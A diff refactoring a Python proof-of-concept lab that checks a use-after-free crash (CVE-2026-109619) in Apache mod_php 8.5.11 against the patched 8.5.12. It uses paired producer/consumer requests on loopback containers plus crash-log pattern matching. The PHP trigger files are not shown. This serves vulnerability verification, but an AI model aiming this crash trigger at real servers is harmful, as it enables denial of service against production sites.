@@ -217,11 +217,16 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-"""Prove CVE-2026-109619 stale worker-global UAF on Apache mod_php 8.5.11 vs 8.5.12."""
+"""Loopback lab for CVE-2026-109619: stale worker-global UAF on Apache mod_php.
+
+A fatal on PHP 8.5 publishes fatal_error_backtraces and never resets it.
+The next request on the same prefork child applies a per-dir INI diagnostic
+before php_request_startup() and consumes the dangling pointer.
+php:8.5.11-apache resets the consumer; php:8.5.12-apache stays up.
+"""
 
 import http.client
 import os
-import re
 import socket
 import subprocess
 import time
@@ -232,19 +237,55 @@ LABEL = "CVE-2026-109619"
 WITNESS = "CVE-2026-109619-UAF-WITNESS"
 COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "cve-2026-109619")
 HERE = Path(__file__).resolve().parent
-
 HOST = "127.0.0.1"
-VULN_PORT = 18222
-PATCHED_PORT = 18223
-VULN_IMAGE = "php:8.5.11-apache"
-PATCHED_IMAGE = "php:8.5.12-apache"
 SAPI = "apache2handler"
 HOW = "backtrace"
+USER_AGENT = "cve-2026-109619-lab"
 ROUNDS = 8
 TIMEOUT_S = 8.0
+VULN_IMAGE = "php:8.5.11-apache"
+PATCHED_IMAGE = "php:8.5.12-apache"
+VULN_PORT = 18222
+PATCHED_PORT = 18223
+VULN_VERSION = "8.5.11"
+PATCHED_VERSION = "8.5.12"
+PRODUCER_PATH = "/producer.php"
+CONSUMER_PATH = "/consumer.php"
+PID_PATH = "/pid.php"
+
+_RESET = (
+    ConnectionResetError,
+    ConnectionAbortedError,
+    BrokenPipeError,
+    http.client.RemoteDisconnected,
+    http.client.IncompleteRead,
+    http.client.BadStatusLine,
+)
+_TIMEOUT = (TimeoutError, socket.timeout)
+_CRASH = (
+    "addresssanitizer",
+    "heap-use-after-free",
+    "heap-buffer-overflow",
+    "use-after-poison",
+    "zend_mm_heap corrupted",
+    "zend_mm_heap",
+    "segmentation fault",
+    "sigsegv",
+    "signal 11",
+    "core dumped",
+    "fatal signal",
+)
 
 
-@dataclass(frozen=True)
+@dataclass(frozen=True, slots=True)
+class Target:
+    name: str
+    port: int
+    image: str
+    version: str
+
+
+@dataclass(frozen=True, slots=True)
 class HttpResult:
     complete: bool
     reset: bool
@@ -254,6 +295,18 @@ class HttpResult:
     headers: dict[str, str]
     error: str
     pid: str
+
+    @staticmethod
+    def blank(error: str = "not-started") -> "HttpResult":
+        return HttpResult(False, False, False, None, b"", {}, error, "")
+
+    @property
+    def text(self) -> str:
+        return self.body.decode("utf-8", errors="replace")
+
+
+VULN = Target("vuln", VULN_PORT, VULN_IMAGE, VULN_VERSION)
+PATCHED = Target("patched", PATCHED_PORT, PATCHED_IMAGE, PATCHED_VERSION)
 
 
 def log(msg: str) -> None:
@@ -265,6 +318,13 @@ def fail(reason: str) -> int:
     return 1
 
 
+def clip(text: str, limit: int = 220) -> str:
+    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
+    if len(compact) > limit:
+        return compact[:limit] + "..."
+    return compact
+
+
 def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
     return subprocess.run(
         ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
@@ -272,170 +332,7 @@ def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
         text=True,
         capture_output=True,
         timeout=timeout,
-    )
-
-
-def _header_map(resp: http.client.HTTPResponse) -> dict[str, str]:
-    out: dict[str, str] = {}
-    for key, value in resp.getheaders():
-        out[key.lower()] = value
-    return out
-
-
-def http_get(port: int, path: str, timeout: float = TIMEOUT_S) -> HttpResult:
-    body = b""
-    headers: dict[str, str] = {}
-    status: int | None = None
-    try:
-        conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
-        try:
-            conn.request(
-                "GET",
-                path,
-                headers={
-                    "Host": HOST,
-                    "Connection": "close",
-                    "User-Agent": "cve-2026-109619-lab",
-                },
-            )
-            resp = conn.getresponse()
-            status = int(resp.status)
-            headers = _header_map(resp)
-            body = resp.read()
-        finally:
-            conn.close()
-    except TimeoutError:
-        return HttpResult(False, False, True, status, body, headers, "timeout", "")
-    except socket.timeout:
-        return HttpResult(False, False, True, status, body, headers, "timeout", "")
-    except (
-        ConnectionResetError,
-        ConnectionAbortedError,
-        BrokenPipeError,
-        http.client.RemoteDisconnected,
-        http.client.IncompleteRead,
-        http.client.BadStatusLine,
-    ) as exc:
-        return HttpResult(False, True, False, status, body, headers, str(exc), "")
-    except OSError as exc:
-        err = str(exc).lower()
-        reset = any(
-            tok in err
-            for tok in ("reset", "broken pipe", "connection abort", "refused", "empty")
-        )
-        return HttpResult(False, reset, False, status, body, headers, str(exc), "")
-    pid = headers.get("x-worker-pid", "")
-    return HttpResult(True, False, False, status, body, headers, "", pid)
-
-
-def two_phase(port: int, timeout: float = TIMEOUT_S) -> tuple[HttpResult, HttpResult]:
-    """Producer then consumer on one HTTP/1.1 connection (same worker)."""
-    producer = HttpResult(False, False, False, None, b"", {}, "not-started", "")
-    consumer = HttpResult(False, False, False, None, b"", {}, "not-started", "")
-    conn: http.client.HTTPConnection | None = None
-    try:
-        conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
-        conn.request(
-            "GET",
-            "/producer.php",
-            headers={
-                "Host": HOST,
-                "Connection": "keep-alive",
-                "User-Agent": "cve-2026-109619-lab",
-            },
-        )
-        resp1 = conn.getresponse()
-        body1 = resp1.read()
-        headers1 = _header_map(resp1)
-        producer = HttpResult(
-            True,
-            False,
-            False,
-            int(resp1.status),
-            body1,
-            headers1,
-            "",
-            headers1.get("x-worker-pid", ""),
-        )
-        conn.request(
-            "GET",
-            "/consumer.php",
-            headers={
-                "Host": HOST,
-                "Connection": "close",
-                "User-Agent": "cve-2026-109619-lab",
-            },
-        )
-        resp2 = conn.getresponse()
-        body2 = resp2.read()
-        headers2 = _header_map(resp2)
-        consumer = HttpResult(
-            True,
-            False,
-            False,
-            int(resp2.status),
-            body2,
-            headers2,
-            "",
-            headers2.get("x-worker-pid", ""),
-        )
-    except TimeoutError:
-        if not producer.complete:
-            producer = HttpResult(False, False, True, None, b"", {}, "timeout", "")
-        else:
-            consumer = HttpResult(False, False, True, None, b"", {}, "timeout", producer.pid)
-    except socket.timeout:
-        if not producer.complete:
-            producer = HttpResult(False, False, True, None, b"", {}, "timeout", "")
-        else:
-            consumer = HttpResult(False, False, True, None, b"", {}, "timeout", producer.pid)
-    except (
-        ConnectionResetError,
-        ConnectionAbortedError,
-        BrokenPipeError,
-        http.client.RemoteDisconnected,
-        http.client.IncompleteRead,
-        http.client.BadStatusLine,
-    ) as exc:
-        if not producer.complete:
-            producer = HttpResult(False, True, False, None, b"", {}, str(exc), "")
-        else:
-            consumer = HttpResult(
-                False, True, False, None, b"", {}, str(exc), producer.pid
-            )
-    except OSError as exc:
-        err = str(exc).lower()
-        reset = any(
-            tok in err
-            for tok in ("reset", "broken pipe", "connection abort", "refused", "empty")
-        )
-        if not producer.complete:
-            producer = HttpResult(False, reset, False, None, b"", {}, str(exc), "")
-        else:
-            consumer = HttpResult(
-                False, reset, False, None, b"", {}, str(exc), producer.pid
-            )
-    finally:
-        if conn is not None:
-            try:
-                conn.close()
-            except OSError:
-                pass
-    return producer, consumer
-
-
-def body_text(result: HttpResult) -> str:
-    return result.body.decode("utf-8", errors="replace")
-
-
-def summarize(name: str, result: HttpResult) -> None:
-    text = body_text(result).replace("\r\n", "\\n").replace("\n", "\\n")
-    if len(text) > 220:
-        text = text[:220] + "..."
-    log(
-        f"{name} complete={int(result.complete)} reset={int(result.reset)} "
-        f"timeout={int(result.timeout)} status={result.status} pid={result.pid!r} "
-        f"error={result.error!r} body={text!r}"
+        check=False,
     )
 
 
@@ -449,33 +346,91 @@ def service_status() -> str:
     return ((proc.stdout or "") + (proc.stderr or "")).strip()
 
 
+def _headers(resp: http.client.HTTPResponse) -> dict[str, str]:
+    return {key.lower(): value for key, value in resp.getheaders()}
+
+
+def _from_response(resp: http.client.HTTPResponse) -> HttpResult:
+    headers = _headers(resp)
+    return HttpResult(
+        complete=True,
+        reset=False,
+        timeout=False,
+        status=int(resp.status),
+        body=resp.read(),
+        headers=headers,
+        error="",
+        pid=headers.get("x-worker-pid", ""),
+    )
+
+
+def _from_exc(exc: BaseException, pid: str = "") -> HttpResult:
+    if isinstance(exc, _TIMEOUT):
+        return HttpResult(False, False, True, None, b"", {}, "timeout", pid)
+    err = str(exc)
+    reset = isinstance(exc, _RESET) or any(
+        tok in err.lower()
+        for tok in ("reset", "broken pipe", "connection abort", "refused", "empty")
+    )
+    return HttpResult(False, reset, False, None, b"", {}, err, pid)
+
+
+def _request(conn: http.client.HTTPConnection, path: str, *, keep_alive: bool) -> HttpResult:
+    conn.request(
+        "GET",
+        path,
+        headers={
+            "Host": HOST,
+            "Connection": "keep-alive" if keep_alive else "close",
+            "User-Agent": USER_AGENT,
+        },
+    )
+    return _from_response(conn.getresponse())
+
+
+def http_get(port: int, path: str) -> HttpResult:
+    conn = http.client.HTTPConnection(HOST, port, timeout=TIMEOUT_S)
+    try:
+        return _request(conn, path, keep_alive=False)
+    except OSError as exc:
+        return _from_exc(exc)
+    finally:
+        conn.close()
+
+
+def two_phase(port: int) -> tuple[HttpResult, HttpResult]:
+    """Producer then consumer on one HTTP/1.1 connection (same worker)."""
+    producer = HttpResult.blank()
+    consumer = HttpResult.blank()
+    conn = http.client.HTTPConnection(HOST, port, timeout=TIMEOUT_S)
+    try:
+        producer = _request(conn, PRODUCER_PATH, keep_alive=True)
+        consumer = _request(conn, CONSUMER_PATH, keep_alive=False)
+    except OSError as exc:
+        failed = _from_exc(exc, producer.pid)
+        if not producer.complete:
+            producer = failed
+        else:
+            consumer = failed
+    finally:
+        try:
+            conn.close()
+        except OSError:
+            pass
+    return producer, consumer
+
+
+def summarize(name: str, result: HttpResult) -> None:
+    log(
+        f"{name} complete={int(result.complete)} reset={int(result.reset)} "
+        f"timeout={int(result.timeout)} status={result.status} pid={result.pid!r} "
+        f"error={result.error!r} body={clip(result.text)!r}"
+    )
+
+
 def crash_needles(blob: str) -> list[str]:
     low = blob.lower()
-    found: list[str] = []
-    needles = (
-        "addresssanitizer",
-        "heap-use-after-free",
-        "heap-buffer-overflow",
-        "use-after-poison",
-        "zend_mm_heap corrupted",
-        "zend_mm_heap",
-        "exit signal segmentation fault",
-        "segmentation fault",
-        "sigsegv",
-        "signal 11",
-        "signal 6",
-        "signal 4",
-        "aborted",
-        "fatal signal",
-        "core dumped",
-        "exit signal",
-        "child pid",
-        "end of script execution",
-    )
-    for needle in needles:
-        if needle in low:
-            found.append(needle)
-    return found
+    return [needle for needle in _CRASH if needle in low]
 
 
 def ioc_lines(service: str, logs: str, status: str) -> None:
@@ -483,160 +438,124 @@ def ioc_lines(service: str, logs: str, status: str) -> None:
     hits = 0
     for line in logs.splitlines():
         low = line.lower()
-        if any(
-            tok in low
-            for tok in (
-                "addresssanitizer",
-                "heap-use-after-free",
-                "zend_mm",
-                "segfault",
-                "sigsegv",
-                "signal",
-                "abort",
-                "core dumped",
-                "exit signal",
-                "child pid",
-                "fatal error",
-                "deprecated",
-                "auto_detect_line_endings",
-                "report_memleaks",
-            )
-        ):
-            log(f"IOC {service}-log {line.strip()[:320]}")
-            hits += 1
-            if hits >= 24:
-                break
+        if not any(tok in low for tok in ("zend_mm", "segfault", "sigsegv", "fatal error", "abort")):
+            continue
+        log(f"IOC {service}-log {line.strip()[:320]}")
+        hits += 1
+        if hits >= 16:
+            break
 
 
 def producer_ok(result: HttpResult) -> bool:
     if result.reset or result.timeout:
         return False
-    text = body_text(result)
-    return "Fatal error" in text or (result.status is not None and result.status >= 500)
+    return "Fatal error" in result.text or (result.status is not None and result.status >= 500)
 
 
 def consumer_alive(result: HttpResult) -> bool:
-    if not result.complete or result.reset or result.timeout:
-        return False
-    if result.status != 200:
-        return False
-    return "consumer-ok" in body_text(result)
+    return (
+        result.complete
+        and not result.reset
+        and not result.timeout
+        and result.status == 200
+        and "consumer-ok" in result.text
+    )
 
 
 def consumer_uaf(result: HttpResult, logs: str) -> tuple[bool, str]:
-    if consumer_alive(result) and "addresssanitizer" not in logs.lower():
+    if consumer_alive(result):
         return False, "consumer-200"
     if result.reset:
         return True, "connection-reset"
+    hits = crash_needles(logs) + crash_needles(result.text) + crash_needles(result.error)
+    if any("zend_mm" in item for item in hits):
+        return True, "zend-mm-corrupt"
+    if any("addresssanitizer" in item or "use-after" in item or "poison" in item for item in hits):
+        return True, "asan"
+    if any("segmentation" in item or "sigsegv" in item or "signal 11" in item for item in hits):
+        return True, "segfault"
     if result.timeout and not result.complete:
         return True, "timeout-incomplete"
-    asan = crash_needles(logs)
-    asan += crash_needles(body_text(result))
-    asan += crash_needles(result.error)
-    if any("addresssanitizer" in x or "use-after" in x or "poison" in x for x in asan):
-        return True, "asan"
-    if any("zend_mm" in x for x in asan):
-        return True, "zend-mm-corrupt"
-    if any(
-        x in asan
-        for x in (
-            "segmentation fault",
-            "sigsegv",
-            "signal 11",
-            "exit signal segmentation fault",
-            "core dumped",
-            "fatal signal",
-        )
-    ):
-        return True, "segfault"
-    if result.status in (500, 502, 503) and not consumer_alive(result):
-        # 500 with PHP fatal is not a UAF; only empty/truncated crash responses count.
-        text = body_text(result)
-        if not text.strip() or "consumer-ok" not in text:
-            if crash_needles(logs):
-                return True, "worker-crash"
-    if not result.complete and not result.timeout:
+    if not result.complete:
         return True, "incomplete"
     return False, "consumer-completed"
 
 
-def parse_pid(result: HttpResult) -> str:
-    if result.pid:
-        return result.pid
-    match = re.search(r"pid=(\d+)", body_text(result))
-    return match.group(1) if match else ""
-
-
 def ready(port: int) -> HttpResult:
-    return http_get(port, "/pid.php")
+    return http_get(port, PID_PATH)
+
+
+def _ready_ok(result: HttpResult, version: str) -> str | None:
+    if not result.complete or "ok" not in result.text:
+        return "not-ready"
+    if SAPI not in result.text:
+        return "sapi-mismatch"
+    if version not in result.text:
+        return "version-mismatch"
+    return None
 
 
 def main() -> int:
     log(
-        f"label={LABEL} vuln={HOST}:{VULN_PORT} patched={HOST}:{PATCHED_PORT} "
-        f"images={VULN_IMAGE},{PATCHED_IMAGE} sapi={SAPI} how={HOW} pin=same-worker"
+        f"label={LABEL} vuln={HOST}:{VULN.port} patched={HOST}:{PATCHED.port} "
+        f"images={VULN.image},{PATCHED.image} sapi={SAPI} how={HOW} pin=same-worker"
     )
 
-    vuln_ready = ready(VULN_PORT)
-    patched_ready = ready(PATCHED_PORT)
+    vuln_ready = ready(VULN.port)
+    patched_ready = ready(PATCHED.port)
     summarize("vuln-ready", vuln_ready)
     summarize("patched-ready", patched_ready)
-    if not vuln_ready.complete or "ok" not in body_text(vuln_ready):
-        ioc_lines("vuln", service_logs("vuln"), service_status())
-        return fail("vuln-not-ready")
-    if not patched_ready.complete or "ok" not in body_text(patched_ready):
-        ioc_lines("patched", service_logs("patched"), service_status())
-        return fail("patched-not-ready")
-    if SAPI not in body_text(vuln_ready) or SAPI not in body_text(patched_ready):
-        return fail("sapi-mismatch")
-    if "8.5.11" not in body_text(vuln_ready):
-        return fail("vuln-version-mismatch")
-    if "8.5.12" not in body_text(patched_ready):
-        return fail("patched-version-mismatch")
+    for target, probe in ((VULN, vuln_ready), (PATCHED, patched_ready)):
+        reason = _ready_ok(probe, target.version)
+        if reason is None:
+            continue
+        ioc_lines(target.name, service_logs(target.name), service_status())
+        prefix = "vuln" if target is VULN else "patched"
+        if reason == "version-mismatch":
+            return fail(f"{prefix}-version-mismatch")
+        if reason == "sapi-mismatch":
+            return fail("sapi-mismatch")
+        return fail(f"{prefix}-not-ready")
 
     log("== patched two-phase ==")
-    patched_prod, patched_cons = two_phase(PATCHED_PORT)
+    patched_prod, patched_cons = two_phase(PATCHED.port)
     summarize("patched-producer", patched_prod)
     summarize("patched-consumer", patched_cons)
     if not producer_ok(patched_prod):
-        ioc_lines("patched", service_logs("patched"), service_status())
+        ioc_lines(PATCHED.name, service_logs(PATCHED.name), service_status())
         return fail("patched-producer-failed")
     if not consumer_alive(patched_cons):
-        ioc_lines("patched", service_logs("patched"), service_status())
+        ioc_lines(PATCHED.name, service_logs(PATCHED.name), service_status())
         return fail("patched-consumer-crashed")
-    patched_after = ready(PATCHED_PORT)
+    patched_after = ready(PATCHED.port)
     summarize("patched-after", patched_after)
-    if not patched_after.complete or "ok" not in body_text(patched_after):
+    if not patched_after.complete or "ok" not in patched_after.text:
         return fail("patched-not-ok")
 
     log("== vuln two-phase ==")
     vuln_uaf = False
     vuln_how = "none"
-    last_prod = HttpResult(False, False, False, None, b"", {}, "none", "")
-    last_cons = HttpResult(False, False, False, None, b"", {}, "none", "")
+    last_prod = HttpResult.blank("none")
+    last_cons = HttpResult.blank("none")
     for round_i in range(1, ROUNDS + 1):
-        last_prod, last_cons = two_phase(VULN_PORT)
+        last_prod, last_cons = two_phase(VULN.port)
         summarize(f"vuln-producer-{round_i}", last_prod)
         summarize(f"vuln-consumer-{round_i}", last_cons)
-        logs = service_logs("vuln")
-        hit, how = consumer_uaf(last_cons, logs)
+        hit, how = consumer_uaf(last_cons, service_logs(VULN.name))
         log(f"vuln-round={round_i} uaf={int(hit)} how={how}")
         if hit:
             vuln_uaf = True
             vuln_how = how
             break
-        if not producer_ok(last_prod):
-            # Producer itself reset: still a same-worker crash after publishing state.
-            if last_prod.reset or last_prod.timeout:
-                vuln_uaf = True
-                vuln_how = "producer-crash"
-                break
+        if last_prod.reset or last_prod.timeout:
+            vuln_uaf = True
+            vuln_how = "producer-crash"
+            break
         time.sleep(0.2)
 
-    logs = service_logs("vuln")
     status = service_status()
-    ioc_lines("vuln", logs, status)
-    ioc_lines("patched", service_logs("patched"), status)
+    ioc_lines(VULN.name, service_logs(VULN.name), status)
+    ioc_lines(PATCHED.name, service_logs(PATCHED.name), status)
 
     if not producer_ok(last_prod) and not vuln_uaf:
         return fail("vuln-producer-failed")
@@ -647,8 +566,8 @@ def main() -> int:
 
     log(
         f"SUCCESS {LABEL} vuln-uaf=yes vuln-crash=yes patched-ok=yes "
-        f"sapi={SAPI} pin=same-worker vuln-image={VULN_IMAGE} "
-        f"patched-image={PATCHED_IMAGE} how={HOW} crash={vuln_how} "
+        f"sapi={SAPI} pin=same-worker vuln-image={VULN.image} "
+        f"patched-image={PATCHED.image} how={HOW} crash={vuln_how} "
         f"{WITNESS}"
     )
     return 0
@@ -656,5 +575,4 @@ def main() -> int:
 
 if __name__ == "__main__":
     raise SystemExit(main())
-
 
